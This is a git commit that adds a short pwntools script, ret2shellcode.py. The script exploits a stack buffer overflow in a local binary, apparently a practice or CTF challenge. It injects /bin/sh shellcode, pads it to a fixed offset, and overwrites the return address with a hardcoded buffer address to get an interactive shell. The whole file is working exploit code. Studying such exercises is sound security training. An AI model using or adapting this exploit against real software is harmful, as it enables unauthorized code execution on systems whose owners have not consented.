37924c02bd741f1bc7e246aa7cd93a343124a6fa
zevmre <zevmre@126.com>
2023-04-17 23:23:48 -0400

    python ret2shellcode example

---
+++ ret2shellcode.py
@@ -0,0 +1,10 @@
+from pwn import *
+
+buf2_addr=0x0804A080
+shellcode=asm(shellcraft.sh())
+print('shellcode length:%d'%(len(shellcode)))
+offset=0x6c+4
+shellcode_pad=shellcode+(offset-len(shellcode))*b'A'
+sh=process('./ret2shellcode')
+sh.sendline(shellcode_pad+p32(buf2_addr))
+sh.interactive()
